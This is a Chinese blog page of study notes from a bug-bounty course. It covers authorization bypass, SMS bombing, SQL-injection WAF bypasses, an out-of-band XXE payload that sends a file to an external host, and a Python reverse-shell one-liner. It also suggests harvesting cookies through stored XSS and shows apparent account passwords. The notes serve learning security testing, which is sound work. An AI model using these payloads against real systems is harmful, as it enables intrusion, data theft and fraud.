https://github.com/VMsec/ihoneyBakFileScan_Modify 2022-09-15</span><br><span class="line">spark（火花） 自动字典生成器 https://github.com/G0mini/spark 2022-09-13</span><br><span class="line">Exphub 漏洞利用脚本 https://github.com/zhzyker/exphub 2021-04-04</span><br><span class="line">EasyPen 综合利用工具 https://github.com/lijiejie/EasyPen 2022-09-16</span><br><span class="line"></span><br><span class="line">漏洞利用</span><br><span class="line">SpringBootExploit https://github.com/0x727/SpringBootExploit 2022-04-17</span><br><span class="line">Springboot漏洞全家桶 https://github.com/woodpecker-appstore/springboot-vuldb 2021-05-24</span><br><span class="line">Log4j2Scan https://github.com/whwlsfb/Log4j2Scan 2022-09-02</span><br><span class="line">ShiroExploit https://github.com/feihong-cs/ShiroExploit-Deprecated 2020-10-04</span><br><span class="line">ShiroAttack2 https://github.com/SummerSec/ShiroAttack2 2022-08-31</span><br><span class="line">thinkphp_gui_tools https://github.com/bewhale/thinkphp_gui_tools 2022-08-18</span><br><span class="line">Fastjson-Patrol https://github.com/ce-automne/FastjsonPatrol 2022-04-01</span><br></pre></td></tr></table></figure>
<h1 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#补天平台</span><br><span class="line">butianHyy19!</span><br><span class="line"></span><br><span class="line">教育行业edu： https://src.sjtu.edu.cn/</span><br><span class="line">cnvd平台： https://www.cnvd.org.cn/</span><br><span class="line"></span><br><span class="line">https://www.vulbox.com/</span><br><span class="line">loudong123</span><br><span class="line"></span><br><span class="line">HackerOne（https://www.hackerone.com/）：全球最大的漏洞赏金平台，拥有超过3000个客户，包括谷歌、微软、PayPal等知名公司。</span><br><span class="line">Bugcrowd（https://www.bugcrowd.com/）：一个全球性的漏洞赏金平台，提供与HackerOne类似的服务，有超过800个客户。</span><br><span class="line">Synack（https://www.synack.com/）：另一个漏洞赏金平台，主要聚焦于企业级安全。</span><br><span class="line">Cobalt（https://cobalt.io/）：提供漏洞赏金服务、渗透测试等安全服务。</span><br><span class="line">Zerocopter（https://zerocopter.com/）：一个漏洞管理平台，将安全测试、漏洞报告、修复等流程整合到一个平台中。</span><br><span class="line">Intigriti（https://www.intigriti.com/）：一个漏洞赏金平台，主要面向欧洲市场。</span><br><span class="line">YesWeHack（https://www.yeswehack.com/）：一个欧洲的漏洞赏金平台，拥有来自全球的安全专家。</span><br><span class="line">FireBounty（https://firebounty.com/）：一个漏洞赏金平台，聚焦于与安全相关的产品和服务，如密码管理器、VPN、防火墙等。</span><br><span class="line">Open Bug Bounty（https://www.openbugbounty.org/）：一个开放式的漏洞报告平台，允许安全研究人员报告漏洞并获得荣誉而非奖金。</span><br></pre></td></tr></table></figure>

<h1 id="北山安全"><a href="#北山安全" class="headerlink" title="北山安全"></a>北山安全</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是第六期 4.5之前看完第二、第四期 大黄蜂管理员小案例录播</span><br><span class="line">24531跟第六期</span><br></pre></td></tr></table></figure>

<h3 id="2-3-越权"><a href="#2-3-越权" class="headerlink" title="2.3 越权"></a>2.3 越权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	水平越权 垂直越权</span></span><br><span class="line"><span class="comment">	未授权访问 接口抓出来 访问一下进去了</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	数据包的关注点</span></span><br><span class="line"><span class="comment">		改提交数据包看传回来的参数变化</span></span><br><span class="line"><span class="comment">		改成确实存在的参数值</span></span><br><span class="line"><span class="comment">		点赞之类不能遍历--&gt;1000条以上--&gt;牢狱之灾</span></span><br><span class="line"><span class="comment">	登录凭证返回过来</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	业务环境</span></span><br><span class="line"><span class="comment">	点赞 评论 收藏点一下抓包 操作点操作一下抓包看变化</span></span><br><span class="line"><span class="comment">	暂不可买--&gt;可买</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	不安全对象的直接调用	IDOR</span></span><br><span class="line"><span class="comment">		允许攻击者绕过网站的身份验证机制，通过修改指向对象链接中的参数来直接访问目标对象资源，这类资源可以属于其他用户的数据库条目及服务器系统中的隐私文件等</span></span><br><span class="line"><span class="comment">	付费视频免费看</span></span><br><span class="line"><span class="comment">	付费小说免费看</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">越权登录 返回包id没有鉴权绑定 直接改id</span><br><span class="line">众测中返回包中的token是否存在通用性</span><br><span class="line">功能点删除cookie</span><br><span class="line">验证码短信轰炸</span><br><span class="line">    没有对发送时间 用户 ip进行</span><br><span class="line">    并发绕过</span><br><span class="line">    删除cookie</span><br><span class="line">    手机号码前后加空格，<span class="number">86</span>，<span class="number">086</span>，<span class="number">0086</span>，+<span class="number">86</span>，<span class="number">0</span>，<span class="number">00</span>，/r,/n, 以及特殊符号</span><br><span class="line">验证码暴力破解</span><br><span class="line">    服务器端未对验证时间、次数作出限制，存在爆破的可能性</span><br><span class="line">验证码回显</span><br><span class="line">验证码绕过</span><br><span class="line">    抓包改手机号(json)给两个手机号发 [手机号<span class="number">1</span>,手机号<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h3 id="2-7-app漏洞挖掘"><a href="#2-7-app漏洞挖掘" class="headerlink" title="2.7 app漏洞挖掘"></a>2.7 app漏洞挖掘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	1.adb连接电脑 在手机上执行shell桥梁</span></span><br><span class="line"><span class="comment">	adb shell 进入手机shell</span></span><br><span class="line"><span class="comment">	打开 deeplink</span></span><br><span class="line"><span class="comment">		adb shell am start -W -a android.intent.action.VIEW -d &quot;deeplink&quot;</span></span><br><span class="line"><span class="comment">	打开 activity</span></span><br><span class="line"><span class="comment">		adb shell am start -n 包名/activity名</span></span><br><span class="line"><span class="comment">	转发端口到电脑</span></span><br><span class="line"><span class="comment">		adb forward tcp:27042 tcp:27042</span></span><br><span class="line"><span class="comment">	当前activity</span></span><br><span class="line"><span class="comment">		adb shell dumpsys activity activities</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	2.frida可以调试app的工具</span></span><br><span class="line"><span class="comment">	常用语句	frida-ps -Ua</span></span><br><span class="line"><span class="comment">	常用frida hook app函数</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	3.app反编译即java反编译</span></span><br><span class="line"><span class="comment">	jadx为反编译工具</span></span><br><span class="line"><span class="comment">	github.com/skylot/jadx/releases/tag/v1.4.4</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	18/91分钟 看不下去了</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="2-8-后端漏洞"><a href="#2-8-后端漏洞" class="headerlink" title="2.8 后端漏洞"></a>2.8 后端漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	SQL注入 XXE SSRF		相对独立危害较高	可能导致命令执行</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	sql绕waf</span></span><br><span class="line"><span class="comment">		1.注释</span></span><br><span class="line"><span class="comment">		2.四则运算</span></span><br><span class="line"><span class="comment">		3.替换函数</span></span><br><span class="line"><span class="comment">		4.云waf</span></span><br><span class="line"><span class="comment">	python 获取ascii码</span></span><br><span class="line"><span class="comment">	ord(&#x27;r&#x27;)=114</span></span><br><span class="line"><span class="comment">	chr(114)=&#x27;r&#x27;</span></span><br><span class="line"><span class="comment">	chr(0x7e)=&#x27;~&#x27;</span></span><br><span class="line"><span class="comment">	框架内不好挖 新加入的内容可能没有加入框架 能挖</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	xml实体注入，导致ssrf或本地文件读取</span></span><br><span class="line"><span class="comment">	大部分都是docx或xlxs文件导致</span></span><br><span class="line"><span class="comment">	https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration</span></span><br><span class="line"><span class="comment">	xxe payload不会变！！</span></span><br><span class="line"><span class="comment">	1.117.139.173:8080/login	java_sec_code</span></span><br><span class="line"><span class="comment">	dnslog.cn-&gt;y2dkdo.dnslog.cn-&gt;xxe.y2dkdo.dnslog.cn</span></span><br><span class="line"><span class="comment">	文件上传xxe</span></span><br><span class="line"><span class="comment">		解压xlsx文件 有个xxe文件在里面然后给它改了 再压缩回去上传</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	ssrf利用价值 请求内网 请求外网不算洞</span></span><br><span class="line"><span class="comment">	难点在于如何绕过</span></span><br><span class="line"><span class="comment">	ssrf bypass</span></span><br><span class="line"><span class="comment">	1.302 bypass</span></span><br><span class="line"><span class="comment">	2.@字符	(test.com@127.0.0.1)	有的waf只检测前面</span></span><br><span class="line"><span class="comment">	3.dns rebinding</span></span><br><span class="line"><span class="comment">		https://lock.cmpxchg8b.com/rebinder.html</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="comment">/*31321*/</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="comment">/*!and*/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span><span class="literal">true</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>)<span class="comment">--+		1</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>)<span class="comment">--+		0</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;?&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;?&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>&quot;?&quot;)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(ascii(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>)</span><br><span class="line"></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(ord(<span class="built_in">SUBSTRING</span>(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>)</span><br><span class="line">SUBSTR<span class="comment">--&gt;LEFT</span></span><br><span class="line"><span class="keyword">and</span><span class="comment">--&gt;&amp;&amp;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">检测 加入</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;YOUR-DTD-URL&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ki67aa1etx1dbofbf4j7ng302r8hw6.oastify.com&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line">burp有回返说明请求成功</span><br><span class="line"></span><br><span class="line">攻击</span><br><span class="line">抓包找到九二一插入xml的数据报	插入</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://exploit-0aed0027045b5457c0b82643014a006d.exploit-server.net/exploit&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"></span><br><span class="line">攻击页面(上面的网址自己的攻击地址) body中写入 替换其中burpdnslog</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://ki67aa1etx1dbofbf4j7ng302r8hw6.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">burp的dnslog会进场更新?</span><br><span class="line"></span><br><span class="line">文件xxe</span><br><span class="line">github.com/JoyChou93/java-sec-code</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.html</span><br><span class="line">&lt;iframe src=127.0.0.1&gt;</span><br><span class="line">请求这个页面会 加载本地127.0.0.1 虽然拒绝连接</span><br><span class="line"></span><br><span class="line">html转pdf过程中 网页任何东西都会转</span><br></pre></td></tr></table></figure>

<h3 id="2-9-另类逻辑漏洞"><a href="#2-9-另类逻辑漏洞" class="headerlink" title="2.9 另类逻辑漏洞"></a>2.9 另类逻辑漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	cookie可以爆破</span></span><br><span class="line"><span class="comment">	js中的业务</span></span><br><span class="line"><span class="comment">	可控参数的爆破</span></span><br><span class="line"><span class="comment">	短信逻辑问题</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	cookie一个一个删除 看返回内容</span></span><br><span class="line"><span class="comment">	找出关键的cookie的键值 然后找几个账号看这个包变化进行爆破 几亿用户那种cookie较为容易爆破出来</span></span><br><span class="line"><span class="comment">	xxAAAAAxxAAAAAAxxAAAAAxxAAAAAAA类型</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	带验证码登录框 注册忘记密码</span></span><br><span class="line"><span class="comment">		弱口令 xss 抓响应包 sql注入 注册admin去覆盖</span></span><br><span class="line"><span class="comment">	js 网页调试器 接口关键字搜索get/ api pos ajax http https</span></span><br><span class="line"><span class="comment">	ajax中</span></span><br><span class="line"><span class="comment">		data:&#123;</span></span><br><span class="line"><span class="comment">			api:&#x27;/v1/passport/reset_psd&#x27;,</span></span><br><span class="line"><span class="comment">			user_login:$(&#x27;.username_ipt&#x27;).val(),</span></span><br><span class="line"><span class="comment">			user_pass:$(&#x27;.password1&#x27;).val(),</span></span><br><span class="line"><span class="comment">			confirm_pass:$(&#x27;.password2&#x27;).val()</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		dataType:&#x27;json&#x27;,</span></span><br><span class="line"><span class="comment">		type:&#x27;get&#x27;</span></span><br><span class="line"><span class="comment">		url/api/proxy/index?api=/v1/passport/reset_psd&amp;user_login=..&amp;..&amp;..</span></span><br><span class="line"><span class="comment">	如果验证在调用接口之前 接口还能找的到</span></span><br><span class="line"><span class="comment">	api接口可以挖到一切漏洞</span></span><br><span class="line"><span class="comment">	js断点调试</span></span><br><span class="line"><span class="comment">	后台的修改密码 发包尝试改id=001或者删除cookie看能不能成</span></span><br><span class="line"><span class="comment">	put /api/security/user/7/password?oldPassword=...&amp;newPassword=...</span></span><br><span class="line"><span class="comment">        7-&gt;别的数字比如1 可能是用户的id</span></span><br><span class="line"><span class="comment">        删除oldPassword或者置空</span></span><br><span class="line"><span class="comment">	js突破sign定位</span></span><br><span class="line"><span class="comment">        1.删掉</span></span><br><span class="line"><span class="comment">        2.彩虹表找出来然后猜 涉及md5加密</span></span><br><span class="line"><span class="comment">        3.前端找出sign怎么计算的</span></span><br><span class="line"><span class="comment">    post参数 删 改</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3-付费类站点分析与初识情报"><a href="#4-3-付费类站点分析与初识情报" class="headerlink" title="4.3 付费类站点分析与初识情报"></a>4.3 付费类站点分析与初识情报</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 举一反三</span><br><span class="line">用免费的接口去尝试付费的接口 越权</span><br><span class="line">开通vip获取接口 然后使用没有vip的账号对接口进行测试</span><br><span class="line">转战 小程序 app 资产的接口</span><br><span class="line"></span><br><span class="line">二维码保存下来一直扫</span><br><span class="line"></span><br><span class="line">修改返回包的下载劵数量 &gt; 下载所需 --&gt;绕过下载</span><br><span class="line">改所需下载劵-&gt;0</span><br><span class="line">改成vip身份去下载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 初识情报挖掘</span><br><span class="line">对企业有危害的信息</span><br><span class="line">	1.直接向中黑灰获取技术</span><br><span class="line">	2.根据黑灰利用的方式分析出技术加上获取黑灰技术人员的个人信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">ssrf 第一次用dnslog</span><br><span class="line">第二次10.10.10.1</span><br><span class="line">	如果有数据，会有延迟，请求dnslog会有显示，那么可以判断存在一个无回显的ssrf</span><br><span class="line">请求dnslog会导致泄露cookie</span><br><span class="line">b站视频那个头像位置是有发送的控制了头像保存的地址</span><br><span class="line">此处用存储型xss举例更为恰当</span><br><span class="line">把存储型xss换成请求dnslog的url 全网发---&gt;获取全网cookie</span><br></pre></td></tr></table></figure>

<h3 id="4-4-漏洞分析讲解"><a href="#4-4-漏洞分析讲解" class="headerlink" title="4.4 漏洞分析讲解"></a>4.4 漏洞分析讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">返回包不能并发</span><br><span class="line">充钱不能并发 会掏空你的钱包</span><br><span class="line">并发</span><br><span class="line">    send to turbo intruder</span><br><span class="line">    headers 加个参数</span><br><span class="line">        x-req:%s</span><br><span class="line">    使用examples/race.py</span><br><span class="line"></span><br><span class="line">登录框</span><br><span class="line">	app下载 云安全二维码token(oauth登录授权ak/sk sdk) 忘记密码 js接口 log4j? xss sql注入</span><br><span class="line">找回密码</span><br><span class="line">	验证码有时间10分钟之类可以爆破----&gt;重置密码</span><br><span class="line">	返回包state修改看能不能绕过---&gt;一般不行---&gt;后端不认---&gt;但可以尝试下看看有什么信息</span><br><span class="line">	注册个账号登陆进去</span><br><span class="line">		把它的接口找出来，用没有登陆的账号使用的这些接口，看能不能越权</span><br><span class="line">5g容量 回收站扩容			--&gt;存5g删5g--&gt;存5g删5g--&gt;回复10g</span><br><span class="line">管理后台</span><br><span class="line"></span><br><span class="line">iv encryptData sessionKey---&gt;任意用户登录   aes加密</span><br><span class="line">在线ide做题</span><br><span class="line">	写个rce 反弹shell</span><br><span class="line"></span><br><span class="line">nohup python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;;echo 111&amp;</span><br><span class="line"></span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;  </span><br><span class="line"></span><br><span class="line">base64进行加密</span><br><span class="line">python ; 可以不换行</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   	<span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    cmd = <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    ret = subprocess.run(base64.b64decode(cmd.encode()).decode(), shell = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>

<h3 id="4-6-小程序挖掘方法"><a href="#4-6-小程序挖掘方法" class="headerlink" title="4.6 小程序挖掘方法"></a>4.6 小程序挖掘方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#小程序抓包方法</span><br><span class="line">IOS抓包		买个iphone8 7百多</span><br><span class="line">iphone与Burp所在电脑处于同一网段</span><br><span class="line">Burp新增拦截</span><br><span class="line">iphone设置代理</span><br><span class="line">iphone获取证书</span><br><span class="line">iphone安装证书并授权</span><br><span class="line">https://blog.csdn.net/weixin_43222614/article/details/122943719</span><br><span class="line"></span><br><span class="line">Proxifier搭配buro			fiddler也可以</span><br><span class="line"></span><br><span class="line">app抓包 可以考虑再浏览器请求这个ip</span><br><span class="line"></span><br><span class="line">nginx+springboot(title栏小绿叶 也可以没有)</span><br><span class="line">	springboot存在泄露heapdump文件的可能</span><br><span class="line">		springbootscan扫描</span><br><span class="line">		https://blog.csdn.net/weixin_44309905/article/details/127279561</span><br><span class="line">            路由列表</span><br><span class="line">            利用heapdump的工具</span><br><span class="line">                heapdump_tool</span><br><span class="line">                Eclipse MemoryAnalyzer</span><br><span class="line"></span><br><span class="line">小程序反编译</span><br><span class="line">	.../Wechat Files/Applet</span><br><span class="line">	UnpackMiniApp对.wxapkg文件解密---&gt; 工具所在目录wxpack文件夹</span><br><span class="line">	CrackApp(放在D盘) 被解密文件移动到../CrackApp/wxapkg文件夹</span><br><span class="line">		打开CrackApp 刷新 开始执行</span><br><span class="line">	用vscode打开或者微信开发者工具打开</span><br><span class="line">	搜索密钥 secret 找接口api 找key appid</span><br><span class="line">	如果找到大量api接口 导出来写脚本批量访问</span><br><span class="line">	找出来的每个接口又可以sql注入 爆破参数 xss</span><br><span class="line"></span><br><span class="line">敏感信息5要素</span><br><span class="line">	1.身份证</span><br><span class="line">	2.电话号码 家庭住址 银行卡号</span><br><span class="line"></span><br><span class="line">抓小程序app的包 对比 api接口的路径拼接 在哪能输出出来</span><br><span class="line"></span><br><span class="line">删除或者添加接口不能批量爆破</span><br><span class="line"></span><br><span class="line">反编译找云安全密钥进行调用</span><br></pre></td></tr></table></figure>

